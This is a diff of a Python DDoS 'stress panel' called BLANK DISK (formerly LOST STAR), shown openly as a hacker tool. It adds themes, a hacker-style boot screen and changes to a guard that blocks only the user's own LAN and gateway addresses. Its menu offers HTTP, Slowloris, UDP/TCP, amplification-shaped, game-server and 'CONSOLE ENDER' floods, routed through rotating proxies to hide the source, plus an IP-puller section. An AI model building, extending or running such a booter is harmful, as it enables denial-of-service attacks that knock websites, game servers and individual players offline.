@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-LOST STAR — Stress Testing Control Panel v3.0.0
+BLANK DISK — Stress Testing Control Panel v3.0.0
 OWNED BY XRV — THIS MEANS NOT FOR YOU
 """
 from __future__ import annotations
-import asyncio, socket, random, time, sys, os, threading, ipaddress, inspect, struct
+import asyncio, socket, random, time, sys, os, threading, ipaddress, inspect, struct, textwrap
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from typing import List, Dict, Optional, Set, Callable
@@ -17,9 +17,9 @@ except Exception:
     aiohttp = None
     HAS_AIOHTTP = False
 
-VERSION = "4.6.2"
+VERSION = "5.5.0"
 OWNER = "XRV"
-OWNER_MARK = "OWNED BY XRV — LOST STAR"
+OWNER_MARK = "OWNED BY XRV — BLANK DISK"
 _XRV_SEAL = "XRV::LOSTSTAR::SEAL::7f3a9c2e"
 
 PROXY_SOURCES = [
@@ -38,6 +38,154 @@ USER_AGENTS = [
     "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
 ]
 
+# UI themes — switch with [97]
+THEMES = {
+    "mrrobot": {
+        "name": "MR ROBOT",
+        "accent": "\033[38;5;82m",
+        "dim": "\033[38;5;242m",
+        "alert": "\033[38;5;196m",
+        "white": "\033[97m",
+        "mid": "\033[38;5;114m",
+        "ok": "\033[38;5;46m",
+        "warn": "\033[38;5;226m",
+    },
+    "void": {
+        "name": "VOID",
+        "accent": "\033[38;5;45m",
+        "dim": "\033[38;5;238m",
+        "alert": "\033[38;5;201m",
+        "white": "\033[97m",
+        "mid": "\033[38;5;39m",
+        "ok": "\033[38;5;51m",
+        "warn": "\033[38;5;213m",
+    },
+    "amber": {
+        "name": "AMBER",
+        "accent": "\033[38;5;214m",
+        "dim": "\033[38;5;94m",
+        "alert": "\033[38;5;160m",
+        "white": "\033[97m",
+        "mid": "\033[38;5;208m",
+        "ok": "\033[38;5;178m",
+        "warn": "\033[38;5;220m",
+    },
+    "ice": {
+        "name": "ICE",
+        "accent": "\033[38;5;159m",
+        "dim": "\033[38;5;66m",
+        "alert": "\033[38;5;203m",
+        "white": "\033[97m",
+        "mid": "\033[38;5;123m",
+        "ok": "\033[38;5;87m",
+        "warn": "\033[38;5;229m",
+    },
+    "blood": {
+        "name": "BLOOD",
+        "accent": "\033[38;5;196m",
+        "dim": "\033[38;5;52m",
+        "alert": "\033[38;5;124m",
+        "white": "\033[97m",
+        "mid": "\033[38;5;167m",
+        "ok": "\033[38;5;203m",
+        "warn": "\033[38;5;210m",
+    },
+    "pink": {
+        "name": "PINK",
+        "accent": "\033[38;5;213m",
+        "dim": "\033[38;5;96m",
+        "alert": "\033[38;5;199m",
+        "white": "\033[97m",
+        "mid": "\033[38;5;218m",
+        "ok": "\033[38;5;212m",
+        "warn": "\033[38;5;219m",
+    },
+    "galaxy": {
+        "name": "GALAXY",
+        "accent": "\033[38;5;141m",
+        "dim": "\033[38;5;60m",
+        "alert": "\033[38;5;177m",
+        "white": "\033[97m",
+        "mid": "\033[38;5;147m",
+        "ok": "\033[38;5;135m",
+        "warn": "\033[38;5;183m",
+    },
+    "toxic": {
+        "name": "TOXIC",
+        "accent": "\033[38;5;118m",
+        "dim": "\033[38;5;58m",
+        "alert": "\033[38;5;190m",
+        "white": "\033[97m",
+        "mid": "\033[38;5;154m",
+        "ok": "\033[38;5;46m",
+        "warn": "\033[38;5;226m",
+    },
+    "ocean": {
+        "name": "OCEAN",
+        "accent": "\033[38;5;39m",
+        "dim": "\033[38;5;24m",
+        "alert": "\033[38;5;33m",
+        "white": "\033[97m",
+        "mid": "\033[38;5;45m",
+        "ok": "\033[38;5;51m",
+        "warn": "\033[38;5;81m",
+    },
+    "mono": {
+        "name": "MONO",
+        "accent": "\033[38;5;255m",
+        "dim": "\033[38;5;240m",
+        "alert": "\033[38;5;250m",
+        "white": "\033[97m",
+        "mid": "\033[38;5;252m",
+        "ok": "\033[38;5;255m",
+        "warn": "\033[38;5;248m",
+    },
+    "lava": {
+        "name": "LAVA",
+        "accent": "\033[38;5;202m",
+        "dim": "\033[38;5;52m",
+        "alert": "\033[38;5;160m",
+        "white": "\033[97m",
+        "mid": "\033[38;5;208m",
+        "ok": "\033[38;5;214m",
+        "warn": "\033[38;5;220m",
+    },
+    "mint": {
+        "name": "MINT",
+        "accent": "\033[38;5;121m",
+        "dim": "\033[38;5;65m",
+        "alert": "\033[38;5;85m",
+        "white": "\033[97m",
+        "mid": "\033[38;5;158m",
+        "ok": "\033[38;5;120m",
+        "warn": "\033[38;5;193m",
+    },
+}
+ACTIVE_THEME = ["mrrobot"]
+
+def apply_theme(name: str):
+    """Repaint C.* palette from THEMES — actually changes on-screen colors."""
+    if name not in THEMES:
+        name = "mrrobot"
+    ACTIVE_THEME[0] = name
+    th = THEMES[name]
+    C.NEON = th["accent"]
+    C.ASH = th["dim"]
+    C.FIRE1 = th["alert"]
+    C.FIRE2 = th.get("mid", th["accent"])
+    C.FIRE3 = th.get("mid", th["accent"])
+    C.W = th["white"]
+    C.G = th.get("ok", th["accent"])
+    C.Y = th.get("warn", th["accent"])
+    C.R = th["alert"]
+    C.B = th.get("mid", th["accent"])
+    C.STEEL = th["dim"]
+    C.BOLD = "\033[1m"
+    C.END = "\033[0m"
+    C.D = th["dim"]
+
+
+
 class C:
     R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"; W="\033[97m"; D="\033[90m"
     BOLD="\033[1m"; END="\033[0m"
@@ -47,120 +195,180 @@ class C:
 def clear():
     os.system("cls" if os.name=="nt" else "clear")
 
-BANNER = f"""
-{C.W}{C.BOLD}
-            @@@@@@@@@@@@@@@@#%
-           +%%@@@@@@@@@@@@@@@==.                                                                      +@@@@@                                                  @###
-               @@@@@@@@@=:    ===                                                                   @@@@@@@@                                               *@#####
-              %@@@@@@@#@==.    *==-                                                                 @@@@@@@@                                              --######+
-              @@@@@@@@#%====     ===                @@@@@@@@@##                 @@@@@@@@##          @@@@@@@#                                @@#@         ---%######
-             %@@@@@@@#@=======    *==          *@@@@@@@@@@@@@@@@@#.         @@@@@@@@@@@@@@@@@#  -@@@@@@@@@@@@@@@####@.                 @############## .-%##################      %@###########.     .@@######+ =@#######
-             @@@@@@@@#@========     =        @@@@@@@@=-  :-@@@@@@@@#.     %@@@@@@%+   .=@@@@@@+  %%%@@@@@@@@%%%%@#@=+                %#####@*  :-@#####. =%%%######%%@@###@    .@######%%%@######.--:-%@@######@##########
-            @@@@@@@@#@===========          @@@@@@@#%*-.    .%@@@@@@@#%   -@@@@@@@#+    ..@@@@=+..   @@@@@@@#      --+               +@######    ..=###...  .-@######     *    *@######   .:=######--    :=########@-.:####
-            @@@@@@@@#%===========        :@@@@@@@#%**+-.    .@@@@@@@@#:  .%@@@@@@@@#@   :::-***..   %@@@@@@#      -+:              -:%########=.:::--*..  ---%######+       -:.%#@@%*+ .::--%######  .::--%######@ .::.%##
-           @@@@@@@@#@===========+       :@@@@@@@@@=***+-:    %@@@@@@@#%    %@@@@@@@@@@@@#   +** .   %@@@@@@#.    .-+               ::..%###########  .   ---:-####### .   -:::.      .:*%@@########+::---:-@#####:::::::++
-          :@@@@@@@@#@===========        @@@@@@@@#@==***++:   %@@@@@@@#==     .%@@@@@@@@@@@@#+** .   %@@@@@##.    :-.              ::..  .+%###########= ------%######   .-:::     +@########@%######-------%######:::.
-          @@@@@@@@#@===========*       .@@@@@@@@#%===***++:  @@@@@@@@@===  .    .:%@@@@@@@@@@#+     %@@@@###.    -               -:..       :-%#########%----:%######@ -:::     -@######%:  :+######%-----:-@######
-         *@@@@@@@@#@===========   @##% .@@@@@@@@#@=====**   =@@@@@@@#=*==@@@#*      .%@@@@@@@@@     %@@@####                     ::. +###:       %#######*---:+#######:::     --%####### :---:%######------:*######
-         @@@@@@@@#@============ :@@@#@==%@@@@@@@@#%=====    @@@@@@@%=***+@@@@@        .@@@@@@@@     %@@#####@      @@             . --####*      ..@######-----%######@    :@#--%#######----+@#######@-----:-%######
-        %@@@@@@@@#@============@@@@@@===.@@@@@@@@@#%====  %@@@@@@@%*+***%@@@@@#       +@@@@@@#=     %@###############@             ---######*  .::*######%---:::###############%:%########################--:-#######
-      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@***=+%@@@@@@@@@@@@@@@@@@@@@=+++++**%@@@@@@@@@@@@@@@@@@@@**.    .%############@=-.            ---:%################@%--::::. @##########@+::. %###########@.%#######@--%#############+
-   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@=*****= =%@@@@@@@@@@@@@@==+:---++++*.=%@@@@@@@@@@@@@@@=+-+*=    : +@######@@=- ...            --:: :-%%@#######@@%*.--:::::.. .%@##@@%* :::... ..%%@@@@%*::. -%@@=:---:+++++++++++++++
-  ++++++++++++++++++++-------------=********=  :--+=%%+**+.    .:---++++     ::--+++++     :-++*    :.   :-- .     ..             -::                .  :::::..          .:::..           .::.      ----:
-                                     ********                   .::--++                    .:++     :.            ...             ::                    .::..           ::...           ::..     ----.
-                                       *****+                    .::-                       :-      ..                            :               .      ...             ..          ::..      ---
-                                         ***
-{C.END}
-{C.ASH}  · ★ ·  *  ·   ★    ·  *  ·   ★  ·  *  ·{C.END}
-{C.ASH}  ╔════════════════════════════════════════════════════╗
-  ║{C.NEON} ★ LOST STAR · STRESS ENGINE v{VERSION} ★            {C.ASH}║
-  ║{C.STEEL}   proxy-routed · multi-vector · starlit              {C.ASH}║
-  ║{C.FIRE1}{C.BOLD}   OWNED BY XRV — LOST STAR                           {C.ASH}║
-  ╚════════════════════════════════════════════════════╝{C.END}
-"""
+
+
+BANNER = ""
+
 
 def loading_screen():
-    clear()
-    glyphs = ["·", "*", "★", "✦", ".", "✧", "⋆"]
-    width, height, phases = 72, 18, 12
-    for phase in range(phases):
+    apply_theme(ACTIVE_THEME[0])
+    width, height = 78, 24
+    glyphs = list("01アイウエオカキクケコ░▒▓█#@$%*+<>/")
+    phrases = [
+        "hello, friend",
+        "control is an illusion",
+        "we are finally free",
+        "blank disk mounting",
+        "fsociety rootkit online",
+    ]
+    for phase in range(16):
         clear()
-        rows = []
-        for r in range(height):
-            line = []
-            for c in range(width):
-                dens = 0.07 + phase * 0.018
-                if abs(r - height // 2) < 4 and abs(c - width // 2) < 16:
-                    dens += 0.12
-                line.append(random.choice(glyphs) if random.random() < dens else " ")
-            rows.append("".join(line))
-        print(C.ASH + chr(10).join(rows) + C.END)
-        print()
-        print(f"{C.W}{C.BOLD}                 ★ aligning lost star ★{C.END}")
-        print(f"{C.NEON}                 {'★'*(phase+1)}{'·'*(phases-phase-1)}{C.END}")
-        time.sleep(0.12)
+        # full screen matrix rain
+        for row in range(height):
+            line = ""
+            for col in range(width):
+                dens = 0.1 + phase * 0.015
+                if row == height // 2 and 20 < col < 58:
+                    dens = 0.0
+                if random.random() < dens:
+                    line += random.choice(glyphs)
+                else:
+                    line += " "
+            print(f"{C.NEON}{line}{C.END}")
+        # center message overwrite feel
+        msg = phrases[phase % len(phrases)]
+        print(f"\033[{height//2};{max(1,(width-len(msg))//2)}H{C.W}{C.BOLD}{msg}{C.END}")
+        bar = "█" * (phase + 1) + "░" * (16 - phase - 1)
+        print(f"\033[{height};1H{C.ASH}   [{C.NEON}{bar}{C.ASH}] {(phase+1)*100//16}%  blank disk boot{C.END}")
+        time.sleep(0.11)
     clear()
-    print(BANNER)
+    print(get_banner())
     print()
     steps = [
-        "charting constellations", "igniting core", "binding threads",
-        "locking safety", "harvesting proxies", "loading L7", "loading L4",
-        "loading games", "opening L6", "soft area", "starfield online"
+        "opening root shell",
+        "loading exploit chain",
+        "binding proxy mesh",
+        "arming soft area",
+        "router shield check",
+        "fsociety online",
     ]
     for i, name in enumerate(steps):
-        pct = int((i+1)/len(steps)*100)
-        bar = "★"*(i+1) + "·"*(len(steps)-i-1)
-        sys.stdout.write(f"\r  {C.NEON}✦{C.END} {C.STEEL}{name:<24}{C.END} [{C.FIRE2}{bar}{C.END}] {pct:3d}%")
-        sys.stdout.flush(); time.sleep(0.11)
+        pct = int((i + 1) / len(steps) * 100)
+        bar = "█" * (i + 1) + "░" * (len(steps) - i - 1)
+        sys.stdout.write(f"\r   {C.NEON}>{C.END} {C.STEEL}{name:<22}{C.END} [{C.NEON}{bar}{C.END}] {pct:3d}%")
+        sys.stdout.flush()
+        time.sleep(0.1)
     print()
-    print(f"\n  {C.G}{C.BOLD}★ LOST STAR {VERSION} ONLINE ★{C.END}\n")
+    print(f"\n   {C.G}{C.BOLD}hello, friend.  BLANK DISK {VERSION} ready.{C.END}\n")
     time.sleep(0.35)
 
-# ── SAFETY ─────────────────────────────────────────────
+def get_banner():
+    import base64
+    rows = base64.b64decode('ICAgICAgX19fICAgICAgICAgICBfX18gICAgICAgX19fICAgICAgICAgICBfX18gICAgICAgICAgIF9fXyAgICAgICAgICAgICAgICAgICAgX19fICAgICAgICAgICAgICAgICAgICAgICBfX18gICAgICAgICAgIF9fXyAgICAgCiAgICAgL1wgIFwgICAgICAgICAvXF9fXCAgICAgL1wgIFwgICAgICAgICAvXF9fXCAgICAgICAgIC9cX19cICAgICAgICAgICAgICAgICAgL1wgIFwgICAgICAgICAgX19fICAgICAgICAvXCAgXCAgICAgICAgIC9cX19cICAgIAogICAgLzo6XCAgXCAgICAgICAvOi8gIC8gICAgLzo6XCAgXCAgICAgICAvOjp8ICB8ICAgICAgIC86LyAgLyAgICAgICAgICAgICAgICAgLzo6XCAgXCAgICAgICAgL1wgIFwgICAgICAvOjpcICBcICAgICAgIC86LyAgLyAgICAKICAgLzovXDpcICBcICAgICAvOi8gIC8gICAgLzovXDpcICBcICAgICAvOnw6fCAgfCAgICAgIC86L19fLyAgICAgICAgICAgICAgICAgLzovXDpcICBcICAgICAgIFw6XCAgXCAgICAvOi9cIFwgIFwgICAgIC86L19fLyAgICAgCiAgLzo6XH5cOlxfX1wgICAvOi8gIC8gICAgLzo6XH5cOlwgIFwgICAvOi98OnwgIHxfXyAgIC86OlwgIFxfX19fICAgICAgICAgICAgLzovICBcOlxfX1wgICAgICAvOjpcX19cICBfXDpcflwgXCAgXCAgIC86OlwgIFxfX19fIAogLzovXDpcIFw6fF9ffCAvOi9fXy8gICAgLzovXDpcIFw6XF9fXCAvOi8gfDp8IC9cX19cIC86L1w6Ojo6OlxfX1wgICAgICAgICAgLzovX18vIFw6fF9ffCAgX18vOi9cL19fLyAvXCBcOlwgXCBcX19cIC86L1w6Ojo6OlxfX1wKIFw6XH5cOlwvOi8gIC8gXDpcICBcICAgIFwvX19cOlwvOi8gIC8gXC9fX3w6fC86LyAgLyBcL198Onx+fnx+ICAgICAgICAgICAgIFw6XCAgXCAvOi8gIC8gL1wvOi8gIC8gICAgXDpcIFw6XCBcL19fLyBcL198Onx+fnx+ICAgCiAgXDpcIFw6Oi8gIC8gICBcOlwgIFwgICAgICAgIFw6Oi8gIC8gICAgICB8Oi86LyAgLyAgICAgfDp8ICB8ICAgICAgICAgICAgICAgXDpcICAvOi8gIC8gIFw6Oi9fXy8gICAgICBcOlwgXDpcX19cICAgICAgfDp8ICB8ICAgIAogICBcOlwvOi8gIC8gICAgIFw6XCAgXCAgICAgICAvOi8gIC8gICAgICAgfDo6LyAgLyAgICAgIHw6fCAgfCAgICAgICAgICAgICAgICBcOlwvOi8gIC8gICAgXDpcX19cICAgICAgIFw6XC86LyAgLyAgICAgIHw6fCAgfCAgICAKICAgIFw6Oi9fXy8gICAgICAgXDpcX19cICAgICAvOi8gIC8gICAgICAgIC86LyAgLyAgICAgICB8OnwgIHwgICAgICAgICAgICAgICAgIFw6Oi9fXy8gICAgICBcL19fLyAgICAgICAgXDo6LyAgLyAgICAgICB8OnwgIHwgICAgCiAgICAgfn4gICAgICAgICAgICBcL19fLyAgICAgXC9fXy8gICAgICAgICBcL19fLyAgICAgICAgIFx8X198ICAgICAgICAgICAgICAgICAgfn4gICAgICAgICAgICAgICAgICAgICAgICBcL19fLyAgICAgICAgIFx8X198ICAgIA==').decode().split(chr(10))
+    return f'{C.NEON}{C.BOLD}' + chr(10) + chr(10).join(rows) + chr(10) + f'{C.END}' + chr(10) + f'{C.ASH}  blank disk · v{VERSION} · owned by xrv · not for you{C.END}' + chr(10)
+
+
 class SafetyGuard:
     PRIVATE=[ipaddress.ip_network(n) for n in [
         "0.0.0.0/8","10.0.0.0/8","100.64.0.0/10","127.0.0.0/8","169.254.0.0/16",
         "172.16.0.0/12","192.168.0.0/16","224.0.0.0/4","240.0.0.0/4"]]
-    SOFT_MAX_PPS=500; SOFT_MAX_HTTP=40; SOFT_MAX_TCP=40; SOFT_MAX_SLOW=40; SOFT_MAX_UDP_TH=6
+    SOFT_MAX_PPS=400; SOFT_MAX_HTTP=30; SOFT_MAX_TCP=30; SOFT_MAX_SLOW=30; SOFT_MAX_UDP_TH=6
+    HARD_PPS=2000; HARD_HTTP=200; HARD_TCP=150
     def __init__(self):
-        self.local_ips:Set[str]=set(); self.gateway_ips:Set[str]=set(); self.soft_mode=True
+        self.local_ips:Set[str]=set()
+        self.gateway_ips:Set[str]=set()
+        self.public_ips:Set[str]=set()
+        self.protected_nets:List= []  # ip_network objects for LAN ranges
+        self.soft_mode=True
+        self.router_shield=True  # ON = never target private/gateway/self
         self._detect()
+    def register_public(self, ip:str):
+        if not ip: return
+        ip=str(ip).strip()
+        if ip:
+            self.public_ips.add(ip)
     def _detect(self):
-        self.local_ips.add("127.0.0.1"); lan=None
+        self.local_ips.update({"127.0.0.1","::1","0.0.0.0","localhost"})
+        lan=None
         try:
-            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(("8.8.8.8",80))
-            lan=s.getsockname()[0]; self.local_ips.add(lan); s.close()
-        except Exception: pass
-        try: self.local_ips.add(socket.gethostbyname(socket.gethostname()))
-        except Exception: pass
-        self.gateway_ips.update({"192.168.0.1","192.168.1.1","192.168.1.254","10.0.0.1"})
-        if lan and not lan.startswith("127."):
-            parts=lan.split(".")
-            if len(parts)==4:
-                self.gateway_ips.add(".".join(parts[:3]+["1"]))
-                self.gateway_ips.add(".".join(parts[:3]+["254"]))
+            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(1.0)
+            s.connect(("8.8.8.8",80)); lan=s.getsockname()[0]; self.local_ips.add(lan); s.close()
+        except Exception:
+            pass
+        try:
+            hn=socket.gethostbyname(socket.gethostname())
+            if not hn.startswith("127."):
+                self.local_ips.add(hn)
+        except Exception:
+            pass
+        self.gateway_ips.update({"192.168.0.1","192.168.1.1","192.168.1.254","10.0.0.1","10.0.0.138"})
+        if lan:
+            try:
+                parts=lan.split(".")
+                if len(parts)==4:
+                    self.gateway_ips.add(".".join(parts[:3]+["1"]))
+                    self.gateway_ips.add(".".join(parts[:3]+["254"]))
+                    # protect whole LAN as a network — do NOT expand to 254 strings
+                    net = ipaddress.ip_network(".".join(parts[:3]+["0"])+"/24", strict=False)
+                    self.protected_nets.append(net)
+            except Exception:
+                pass
+    def _is_protected_ip(self, ip_str:str)->bool:
+        if ip_str in self.local_ips or ip_str in self.gateway_ips or ip_str in self.public_ips:
+            return True
+        try:
+            ip=ipaddress.ip_address(ip_str)
+        except Exception:
+            return False
+        if any(ip in n for n in self.PRIVATE):
+            return True
+        if any(ip in n for n in self.protected_nets):
+            return True
+        return False
     def is_safe(self, target:str)->bool:
+        # Router shield ON → block private/gateway/self so home line stays up
+        # Router shield OFF → allow (you can hit anything; can knock yourself offline)
         host=target.replace("http://","").replace("https://","").split("/")[0].split(":")[0].strip().lower()
-        if host in ("localhost","0.0.0.0") or host in self.local_ips or host in self.gateway_ips: return False
+        if host in ("localhost","0.0.0.0","::1"):
+            return False  # always refuse pure loopback
+        if not getattr(self, "router_shield", True):
+            return True
+        if host in self.local_ips or host in self.gateway_ips:
+            return False
         try:
             ip=ipaddress.ip_address(host)
-            if str(ip) in self.local_ips or str(ip) in self.gateway_ips: return False
+            if str(ip) in self.local_ips or str(ip) in self.gateway_ips:
+                return False
             return not any(ip in n for n in self.PRIVATE)
         except ValueError:
             try:
                 resolved=socket.gethostbyname(host)
-                if resolved in self.local_ips or resolved in self.gateway_ips: return False
+                if resolved in self.local_ips or resolved in self.gateway_ips:
+                    return False
                 ip=ipaddress.ip_address(resolved)
                 return not any(ip in n for n in self.PRIVATE)
-            except Exception: return True
+            except Exception:
+                return True
+
+
+    def lock_summary(self)->str:
+        """Short status line — never dump /24 host list."""
+        bits=[]
+        if self.local_ips:
+            # show only non-range hosts (max few)
+            show=sorted(x for x in self.local_ips if x not in ("0.0.0.0","localhost"))[:4]
+            bits.append(", ".join(show))
+        if self.protected_nets:
+            bits.append("nets "+ ",".join(str(n) for n in self.protected_nets))
+        if self.public_ips:
+            bits.append("WAN "+ ",".join(sorted(self.public_ips)))
+        if self.gateway_ips:
+            bits.append("gw "+ ",".join(sorted(self.gateway_ips)[:3]))
+        return " | ".join(bits) if bits else "..."
     def cap_pps(self,n):
         n = max(1, int(n))
         if self.soft_mode:
-            return min(n, self.SOFT_MAX_PPS)
-        return n  # soft OFF → use exact PPS you set
-    def cap_http(self,n): return max(1,min(n,self.SOFT_MAX_HTTP)) if self.soft_mode else max(1,n)
-    def cap_tcp(self,n): return max(1,min(n,self.SOFT_MAX_TCP)) if self.soft_mode else max(1,n)
-    def cap_slow(self,n): return max(1,min(n,self.SOFT_MAX_SLOW)) if self.soft_mode else max(1,n)
+            return min(n, self.SOFT_MAX_PPS, self.HARD_PPS)
+        return min(n, self.HARD_PPS)
+    def cap_http(self,n):
+        n=max(1,int(n))
+        return min(n, self.SOFT_MAX_HTTP if self.soft_mode else self.HARD_HTTP, self.HARD_HTTP)
+    def cap_tcp(self,n):
+        n=max(1,int(n))
+        return min(n, self.SOFT_MAX_TCP if self.soft_mode else self.HARD_TCP, self.HARD_TCP)
+    def cap_slow(self,n):
+        return max(1,min(n,self.SOFT_MAX_SLOW)) if self.soft_mode else max(1,n)
+
 
 # ── PROXY ──────────────────────────────────────────────
 class ProxyPool:
@@ -1218,27 +1426,26 @@ class Panel:
         self.lan_ip=None
 
     def header(self):
-        clear(); print(BANNER)
-        blocked=", ".join(sorted(self.safety.local_ips)) or "..."
+        clear(); print(get_banner())
+        blocked=self.safety.lock_summary()
         soft=f"{C.G}ON{C.END}" if self.safety.soft_mode else f"{C.R}OFF{C.END}"
-        print(f"  {C.ASH}┌─ STATUS ─────────────────────────────────────────────┐{C.END}")
+        print(f"  {C.NEON}╭─ STATUS ─────────────────────────────────────────────╮{C.END}")
         pub = self.public_ip or "not detected yet"
         lan = self.lan_ip or "-"
-        print(f"  {C.ASH}│{C.END} {C.STEEL}Public IP{C.END}     {C.FIRE3}→{C.END} {C.NEON}{pub}{C.END}")
-        print(f"  {C.ASH}│{C.END} {C.STEEL}LAN IP{C.END}        {C.FIRE3}→{C.END} {C.Y}{lan}{C.END}")
-        print(f"  {C.ASH}│{C.END} {C.STEEL}Local locked{C.END}  {C.FIRE3}→{C.END} {C.Y}{blocked}{C.END}")
-        print(f"  {C.ASH}│{C.END} {C.STEEL}Proxies{C.END}       {C.FIRE3}→{C.END} {C.G}{len(self.pool.proxies):,}{C.END}  live {C.NEON}{len(self.pool.working):,}{C.END}")
-        print(f"  {C.ASH}│{C.END} {C.STEEL}Soft area{C.END}     {C.FIRE3}→{C.END} {soft}   {C.STEEL}build{C.END} {C.NEON}{VERSION}{C.END}")
+        print(f"  {C.NEON}│{C.END} {C.STEEL}Public IP{C.END}     {C.FIRE3}→{C.END} {C.NEON}{pub}{C.END}")
+        print(f"  {C.NEON}│{C.END} {C.STEEL}LAN IP{C.END}        {C.FIRE3}→{C.END} {C.Y}{lan}{C.END}")
+        print(f"  {C.NEON}│{C.END} {C.STEEL}Local locked{C.END}  {C.FIRE3}→{C.END} {C.Y}{blocked}{C.END}")
+        print(f"  {C.NEON}│{C.END} {C.STEEL}Proxies{C.END}       {C.FIRE3}→{C.END} {C.G}{len(self.pool.proxies):,}{C.END}  live {C.NEON}{len(self.pool.working):,}{C.END}")
+        print(f"  {C.NEON}│{C.END} {C.STEEL}Soft area{C.END}     {C.FIRE3}→{C.END} {soft}   {C.STEEL}build{C.END} {C.NEON}{VERSION}{C.END}")
         vps = f"{self.vps_relay[0]}:{self.vps_relay[1]}" if self.vps_relay else "free node off"
-        print(f"  {C.ASH}│{C.END} {C.STEEL}Host node{C.END}     {C.FIRE3}→{C.END} {C.NEON}{vps}{C.END}")
-        print(f"  {C.ASH}└──────────────────────────────────────────────────────┘{C.END}\n")
+        print(f"  {C.NEON}│{C.END} {C.STEEL}Host node{C.END}     {C.FIRE3}→{C.END} {C.NEON}{vps}{C.END}")
+        print(f"  {C.NEON}╰──────────────────────────────────────────────────────╯{C.END}\n")
 
     def menu(self):
         soft = f"{C.G}ON{C.END}" if self.safety.soft_mode else f"{C.R}OFF{C.END}"
         px = len(self.pool.proxies); live = len(self.pool.working)
         print(f"""
-  {C.FIRE1}{C.BOLD}  ▌ LAYER 7  —  HTTP / proxy-routed{C.END}
-  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.FIRE1}{C.BOLD}┌─ LAYER 7 · HTTP ──────────────────────────────────────┐{C.END}
   {C.FIRE2}[1]{C.END}  GET          {C.ASH}│{C.END} {C.STEEL}basic HTTP GET flood{C.END}
   {C.FIRE2}[2]{C.END}  POST         {C.ASH}│{C.END} {C.STEEL}HTTP POST with body{C.END}
   {C.FIRE2}[3]{C.END}  HEAD         {C.ASH}│{C.END} {C.STEEL}HTTP HEAD only{C.END}
@@ -1264,8 +1471,7 @@ class Panel:
   {C.FIRE2}[23]{C.END} SLOW         {C.ASH}│{C.END} {C.STEEL}Slowloris partial headers{C.END}
   {C.FIRE1}[24]{C.END} KILLER       {C.ASH}│{C.END} {C.STEEL}mixed multi-thread blast{C.END}
 
-  {C.FIRE3}{C.BOLD}  ▌ LAYER 4 / 3  —  raw / amp-shape{C.END}
-  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.FIRE3}{C.BOLD}┌─ LAYER 4/3 · RAW ─────────────────────────────────────┐{C.END}
   {C.FIRE3}[30]{C.END} TCP          {C.ASH}│{C.END} {C.STEEL}TCP connect flood (proxied){C.END}
   {C.FIRE3}[31]{C.END} UDP          {C.ASH}│{C.END} {C.STEEL}UDP datagram flood{C.END}
   {C.FIRE3}[32]{C.END} SYN-shape    {C.ASH}│{C.END} {C.STEEL}connect storm (userland){C.END}
@@ -1278,8 +1484,7 @@ class Panel:
   {C.FIRE3}[53]{C.END} MEM          {C.ASH}│{C.END} {C.STEEL}Memcached-shaped UDP{C.END}
   {C.FIRE3}[54]{C.END} CLDAP        {C.ASH}│{C.END} {C.STEEL}CLDAP-shaped UDP{C.END}
 
-  {C.Y}{C.BOLD}  ▌ GAMES  —  server query shapes{C.END}
-  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.Y}{C.BOLD}┌─ GAMES · QUERY ───────────────────────────────────────┐{C.END}
   {C.Y}[36]{C.END} VSE          {C.ASH}│{C.END} {C.STEEL}Valve Source Engine query{C.END}
   {C.Y}[37]{C.END} TS3          {C.ASH}│{C.END} {C.STEEL}TeamSpeak 3 ping shape{C.END}
   {C.Y}[38]{C.END} FIVEM        {C.ASH}│{C.END} {C.STEEL}FiveM getinfo UDP{C.END}
@@ -1295,8 +1500,7 @@ class Panel:
   {C.Y}[48]{C.END} CSGO         {C.ASH}│{C.END} {C.STEEL}CS source query{C.END}
   {C.Y}[49]{C.END} DISCORD      {C.ASH}│{C.END} {C.STEEL}Discord voice RTP-shape{C.END}
 
-  {C.BLOOD}{C.BOLD}  ▌ LAYER 6  —  session / app shapes{C.END}
-  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.BLOOD}{C.BOLD}┌─ LAYER 6 · SESSION ───────────────────────────────────┐{C.END}
   {C.BLOOD}[60]{C.END} SOCKET      {C.ASH}│{C.END} {C.STEEL}raw rapid socket open/close{C.END}
   {C.BLOOD}[61]{C.END} HTTP2       {C.ASH}│{C.END} {C.STEEL}HTTP/2 preface + frames shape{C.END}
   {C.BLOOD}[62]{C.END} WS-FLOOD    {C.ASH}│{C.END} {C.STEEL}WebSocket upgrade flood{C.END}
@@ -1309,23 +1513,20 @@ class Panel:
   {C.BLOOD}[69]{C.END} TELNET      {C.ASH}│{C.END} {C.STEEL}Telnet option negotiation{C.END}
   {C.BLOOD}[76]{C.END} MIX-L6      {C.ASH}│{C.END} {C.STEEL}rotate L6 payloads{C.END}
 
-  {C.FIRE1}{C.BOLD}  ▌ CONSOLE ENDER  —  PSN / Xbox / Switch shapes{C.END}
-  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.FIRE1}{C.BOLD}┌─ CONSOLE ENDER · PSN/XBOX/SW ─────────────────────────┐{C.END}
   {C.FIRE1}[73]{C.END} PSN           {C.ASH}│{C.END} {C.STEEL}PlayStation network-shaped sessions{C.END}
   {C.FIRE1}[74]{C.END} XBOX          {C.ASH}│{C.END} {C.STEEL}Xbox Live-shaped sessions{C.END}
   {C.FIRE1}[75]{C.END} SWITCH        {C.ASH}│{C.END} {C.STEEL}Switch network-shaped sessions{C.END}
   {C.FIRE1}[76]{C.END} CONSOLE-TCP   {C.ASH}│{C.END} {C.STEEL}console TCP session flood{C.END}
   {C.FIRE1}[79]{C.END} CONSOLE-UDP   {C.ASH}│{C.END} {C.STEEL}console getinfo-shaped UDP{C.END}
 
-  {C.Y}{C.BOLD}  ▌ IP TOOLS  —  puller / resolve / discord id{C.END}
-  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.Y}{C.BOLD}┌─ IP TOOLS · PULLER ───────────────────────────────────┐{C.END}
